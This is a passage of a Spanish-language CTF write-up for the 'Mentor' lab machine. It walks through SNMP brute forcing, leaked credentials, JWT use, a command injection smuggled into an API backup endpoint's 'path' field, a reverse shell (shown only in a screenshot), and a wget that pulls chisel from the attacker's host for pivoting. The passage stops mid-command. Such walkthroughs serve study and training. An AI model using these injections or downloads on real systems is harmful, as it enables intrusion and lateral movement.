+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysLocation.0 <span style="color:#f92672">=</span> STRING: Sitting on the Dock of the Bay
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysServices.0 <span style="color:#f92672">=</span> INTEGER: <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORLastChange.0 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.1 <span style="color:#f92672">=</span> OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.2 <span style="color:#f92672">=</span> OID: SNMP-MPD-MIB::snmpMPDCompliance
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.3 <span style="color:#f92672">=</span> OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.4 <span style="color:#f92672">=</span> OID: SNMPv2-MIB::snmpMIB
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.5 <span style="color:#f92672">=</span> OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.6 <span style="color:#f92672">=</span> OID: TCP-MIB::tcpMIB
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.7 <span style="color:#f92672">=</span> OID: UDP-MIB::udpMIB
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.8 <span style="color:#f92672">=</span> OID: IP-MIB::ip
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.9 <span style="color:#f92672">=</span> OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORID.10 <span style="color:#f92672">=</span> OID: NOTIFICATION-LOG-MIB::notificationLogMIB
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.1 <span style="color:#f92672">=</span> STRING: The SNMP Management Architecture MIB.
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.2 <span style="color:#f92672">=</span> STRING: The MIB <span style="color:#66d9ef">for</span> Message Processing and Dispatching.
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.3 <span style="color:#f92672">=</span> STRING: The management information definitions <span style="color:#66d9ef">for</span> the SNMP User-based Security Model.
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.4 <span style="color:#f92672">=</span> STRING: The MIB module <span style="color:#66d9ef">for</span> SNMPv2 entities
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.5 <span style="color:#f92672">=</span> STRING: View-based Access Control Model <span style="color:#66d9ef">for</span> SNMP.
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.6 <span style="color:#f92672">=</span> STRING: The MIB module <span style="color:#66d9ef">for</span> managing TCP implementations
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.7 <span style="color:#f92672">=</span> STRING: The MIB module <span style="color:#66d9ef">for</span> managing UDP implementations
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.8 <span style="color:#f92672">=</span> STRING: The MIB module <span style="color:#66d9ef">for</span> managing IP and ICMP implementations
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.9 <span style="color:#f92672">=</span> STRING: The MIB modules <span style="color:#66d9ef">for</span> managing SNMP Notification, plus filtering.
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORDescr.10 <span style="color:#f92672">=</span> STRING: The MIB module <span style="color:#66d9ef">for</span> logging SNMP Notifications.
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.1 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.2 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.3 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.4 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.5 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.6 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.7 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.8 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.9 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>SNMPv2-MIB::sysORUpTime.10 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>8<span style="color:#f92672">)</span> 0:00:00.08
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemUptime.0 <span style="color:#f92672">=</span> Timeticks: <span style="color:#f92672">(</span>268106<span style="color:#f92672">)</span> 0:44:41.06
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemDate.0 <span style="color:#f92672">=</span> STRING: 2024-8-1,19:11:3.0,+0:0
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 <span style="color:#f92672">=</span> INTEGER: <span style="color:#ae81ff">393216</span>
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 <span style="color:#f92672">=</span> STRING: <span style="color:#e6db74">&#34;BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemNumUsers.0 <span style="color:#f92672">=</span> Gauge32: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemProcesses.0 <span style="color:#f92672">=</span> Gauge32: <span style="color:#ae81ff">228</span>
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 <span style="color:#f92672">=</span> INTEGER: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 <span style="color:#f92672">=</span> No more variables left in this MIB View <span style="color:#f92672">(</span>It is past the end of the MIB tree<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Tampoco es que veamos nada interesante.</p>
+<p>Al intentar con <code>onesixtyone</code> hacer fuerza bruta a las community strings, me di cuenta de que solamente probaba con la versión v1 de SNMP, y no podía especificar la v2c.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ onesixtyone 10.129.228.102 -c /opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
+</span></span><span style="display:flex;"><span>Scanning <span style="color:#ae81ff">1</span> hosts, <span style="color:#ae81ff">120</span> communities
+</span></span><span style="display:flex;"><span>10.129.228.102 <span style="color:#f92672">[</span>public<span style="color:#f92672">]</span> Linux mentor 5.15.0-56-generic <span style="color:#75715e">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
+</span></span><span style="display:flex;"><span>10.129.228.102 <span style="color:#f92672">[</span>public<span style="color:#f92672">]</span> Linux mentor 5.15.0-56-generic <span style="color:#75715e">#62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64</span>
+</span></span></code></pre></div><p>Y si capturas estas solicitudes con <code>wireshark</code> te das cuenta de la problemática.
+<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
+<p>Así que busqué una forma alternativa<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
+<p>Utilizando esta herramienta&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ python3 snmpbrute.py --file<span style="color:#f92672">=</span>/opt/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt --target<span style="color:#f92672">=</span>10.129.228.102
+</span></span></code></pre></div><pre tabindex="0"><code>10.129.228.102 : 161 	Version (v1):	public
+10.129.228.102 : 161 	Version (v2c):	public
+10.129.228.102 : 161 	Version (v2c):	internal
+</code></pre><p>Encontramos la community string <code>internal</code></p>
+<p>Y enumerando el SNMP&hellip;</p>
+<p>Vemos que si ganamos acceso a la máquina seguramente estemos en un contenedor.
+<code>IF-MIB::ifDescr.4 = STRING: docker0</code></p>
+<p>Encontramos que hay una base de datos <code>postgres</code> por detrás.
+<code>HOST-RESOURCES-MIB::hrSWRunName.1925 = STRING: &quot;postgres</code></p>
+<p>Y un servicio <code>login.py</code> que es raro..
+<code>HOST-RESOURCES-MIB::hrSWRunName.2090 = STRING: &quot;login.py&quot;</code></p>
+<p>Y encontramos un information leakage donde se descubre una contraseña.
+<code>HOST-RESOURCES-MIB::hrSWRunParameters.2090 = STRING: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;</code></p>
+<h1 id="foothold-container">Foothold (container)</h1>
+<p>Ahora podemos intentar conseguir un token JWT como el usuario <code>james</code>..</p>
+<p><img src="images/Screenshot_7.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_8.png" alt="Write-up Image"></p>
+<h1 id="abusing-api">Abusing API</h1>
+<p>Ahora podemos intentar crear una frase.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X POST http://api.mentorquotes.htb/quotes/ -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;title&#34;: &#34;Testing&#34;, &#34;description&#34;: &#34;Testing&#34;}&#39;</span>| jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;title&#34;</span>: <span style="color:#e6db74">&#34;Testing&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;description&#34;</span>: <span style="color:#e6db74">&#34;Testing&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;id&#34;</span>: <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Y vemos que se reporta en la página principal, en lo primero que pensé es en hacer un SSTI.
+<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
+<p>Pero no funcionó.
+<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
+<p>Así que enumerando usuarios en el endpoint de /users/
+encontramos otro usuario mas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;james@mentorquotes.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;james&#34;</span>
+</span></span><span style="display:flex;"><span>  }<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#ae81ff">2</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;email&#34;</span>: <span style="color:#e6db74">&#34;svc@mentorquotes.htb&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;username&#34;</span>: <span style="color:#e6db74">&#34;service_acc&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>No me sirve de nada, y después de revisar todos los endpoints no conseguí nada.</p>
+<p>Así que cuando no consigues nada hay que seguir enumerando.</p>
+<p>Con <code>feroxbuster</code> pero utilizando otro diccionario, encontré un endpoint <code>/admin</code> que no estaba documentado en el Swagger.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ feroxbuster -u http://api.mentorquotes.htb -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -d <span style="color:#ae81ff">1</span> -t <span style="color:#ae81ff">100</span>
+</span></span><span style="display:flex;"><span>....
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">307</span>      GET        0l        0w        0c http://api.mentorquotes.htb/admin <span style="color:#f92672">=</span>&gt; http://api.mentorquotes.htb/admin/
+</span></span></code></pre></div><p>Uy, yo esto lo catalogaría como otro Information Leakage&hellip;</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X GET http://api.mentorquotes.htb/admin/ -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;admin_funcs&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;check db connection&#34;</span>: <span style="color:#e6db74">&#34;/check&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;backup the application&#34;</span>: <span style="color:#e6db74">&#34;/backup&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><h2 id="check-endpoint">Check endpoint</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X GET http://api.mentorquotes.htb/admin/check -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;details&#34;</span>: <span style="color:#e6db74">&#34;Not implemented yet!&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Por aquí parece que no es..</p>
+<h2 id="backup-endpoint">Backup endpoint</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X GET http://api.mentorquotes.htb/admin/backup -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> | jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#e6db74">&#34;Method Not Allowed&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Esto tiene mejor pinta..
+Cambiando el método a POST</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;detail&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;loc&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;body&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">]</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;field required&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;value_error.missing&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Añadiendo el encabezado <code>Content-Type: application/json</code> y el parámetro <code>--data '{}'</code> (vacío) para poder enumerar que campos necesito rellenar, nos reporta lo siguiente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;detail&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;loc&#34;</span>: [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;body&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;path&#34;</span>
+</span></span><span style="display:flex;"><span>      ],
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;msg&#34;</span>: <span style="color:#e6db74">&#34;field required&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;value_error.missing&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;path&#34;: &#34;test&#34;}&#39;</span>| jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;INFO&#34;</span>: <span style="color:#e6db74">&#34;Done!&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>¿Done?</p>
+<h1 id="rce">RCE</h1>
+<p>Después de probar un rato, supuse que estaba con tar, zip, 7z&hellip; lo que sea, ejecutando un comando a nivel de sistema donde se está pasando mi input, por lo cual, intenté ejecutar un comando.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X POST http://api.mentorquotes.htb/admin/backup -H <span style="color:#e6db74">&#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0&#39;</span> -H <span style="color:#e6db74">&#39;Content-Type: application/json&#39;</span> --data <span style="color:#e6db74">&#39;{&#34;path&#34;: &#34;asd; ping -c 1 10.10.14.80 #&#34;}&#39;</span>| jq
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;INFO&#34;</span>: <span style="color:#e6db74">&#34;Done!&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo tcpdump icmp -i tun0
+</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
+</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
+</span></span><span style="display:flex;"><span>23:40:50.193172 IP api.mentorquotes.htb &gt; 10.10.14.80: ICMP echo request, id 6400, seq 0, length <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>23:40:50.193200 IP 10.10.14.80 &gt; api.mentorquotes.htb: ICMP echo reply, id 6400, seq 0, length <span style="color:#ae81ff">64</span>
+</span></span></code></pre></div><p>Ahora solo queda mandarnos la reverse shell.
+Después de probar los métodos comunes no pude mandar la revshell.
+Así que como la máquina estaba corriendo <code>Flask</code> sabemos que tiene python, así que probé a mandarme la revshell con python.</p>
+<p>Tuve que pasarme a <code>burpsuite</code> para escapar los caracteres correctamente, además, como es un contenedor, hay que mandar una <code>sh</code> y no una <code>bash</code>
+<img src="images/Screenshot_11.png" alt="Write-up Image"></p>
+<p>Podemos ver que hemos ganado acceso al contenedor</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>ip a
+</span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
+</span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+</span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span><span style="display:flex;"><span>11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu <span style="color:#ae81ff">1500</span> qdisc noqueue state UP
+</span></span><span style="display:flex;"><span>    link/ether 02:42:ac:16:00:03 brd ff:ff:ff:ff:ff:ff
+</span></span><span style="display:flex;"><span>    inet 172.22.0.3/16 brd 172.22.255.255 scope global eth0
+</span></span><span style="display:flex;"><span>       valid_lft forever preferred_lft forever
+</span></span></code></pre></div><p>La flag se encuentra en este contenedor
+<code>/home/svc/user.txt</code></p>
+<h1 id="escaping-the-container">Escaping the container</h1>
+<p>Me importa el archivo <code>db.py</code> de la aplicación ya que contiene credenciales de la base de datos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sqlalchemy <span style="color:#f92672">import</span> (Column, DateTime, Integer, String, Table, create_engine, MetaData)
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sqlalchemy.sql <span style="color:#f92672">import</span> func
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> databases <span style="color:#f92672">import</span> Database
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Database url if none is passed the default one is used</span>
+</span></span><span style="display:flex;"><span>DATABASE_URL <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>getenv(<span style="color:#e6db74">&#34;DATABASE_URL&#34;</span>, <span style="color:#e6db74">&#34;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SQLAlchemy for quotes</span>
+</span></span><span style="display:flex;"><span>engine <span style="color:#f92672">=</span> create_engine(DATABASE_URL)
+</span></span><span style="display:flex;"><span>metadata <span style="color:#f92672">=</span> MetaData()
+</span></span><span style="display:flex;"><span>quotes <span style="color:#f92672">=</span> Table(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;quotes&#34;</span>,
+</span></span><span style="display:flex;"><span>    metadata,
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;id&#34;</span>, Integer, primary_key<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>),
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;title&#34;</span>, String(<span style="color:#ae81ff">50</span>)),
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;description&#34;</span>, String(<span style="color:#ae81ff">50</span>)),
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;created_date&#34;</span>, DateTime, default<span style="color:#f92672">=</span>func<span style="color:#f92672">.</span>now(), nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SQLAlchemy for users</span>
+</span></span><span style="display:flex;"><span>engine <span style="color:#f92672">=</span> create_engine(DATABASE_URL)
+</span></span><span style="display:flex;"><span>metadata <span style="color:#f92672">=</span> MetaData()
+</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> Table(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;users&#34;</span>,
+</span></span><span style="display:flex;"><span>    metadata,
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;id&#34;</span>, Integer, primary_key<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>),
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;email&#34;</span>, String(<span style="color:#ae81ff">50</span>)),
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;username&#34;</span>, String(<span style="color:#ae81ff">50</span>)),
+</span></span><span style="display:flex;"><span>    Column(<span style="color:#e6db74">&#34;password&#34;</span>, String(<span style="color:#ae81ff">128</span>) ,nullable<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Databases query builder</span>
+</span></span><span style="display:flex;"><span>database <span style="color:#f92672">=</span> Database(DATABASE_URL)
+</span></span></code></pre></div><p>Pero nos damos cuenta de que la BBDD está en otro equipo. Pero con chisel podemos hacer port-forwarding fácilmente.</p>
+<p>Me descargo el chisel en la máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget http://10.10.14.80:8081/chisel -O chisel
